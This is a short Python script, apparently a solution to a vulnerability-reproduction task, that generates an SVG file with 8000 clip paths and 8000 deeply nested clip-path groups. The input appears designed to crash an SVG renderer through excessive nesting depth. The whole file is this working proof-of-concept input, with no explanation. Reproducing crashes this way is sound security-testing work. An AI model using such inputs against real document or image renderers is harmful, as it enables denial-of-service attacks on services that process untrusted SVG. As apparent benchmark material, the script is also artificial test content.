class Solution:
    def solve(self, src_path: str) -> bytes:
        n = 8000
        defs_parts = ['<defs>\n']
        for i in range(1, n + 1):
            defs_parts.append(f'<clipPath id="c{i}"><rect x="0" y="0" width="100" height="100" /></clipPath>\n')
        defs_parts.append('</defs>\n')
        defs = ''.join(defs_parts)
        content = '<rect x="0" y="0" width="612" height="792" fill="red" />'
        parts = []
        for i in range(1, n + 1):
            parts.append(f'<g clip-path="url(#c{i})">')
        parts.append(content)
        for _ in range(n):
            parts.append('</g>')
        nested = ''.join(parts)
        svg = f'<svg width="612" height="792" xmlns="http://www.w3.org/2000/svg">\n{defs}{nested}\n</svg>'
        return svg.encode('utf-8')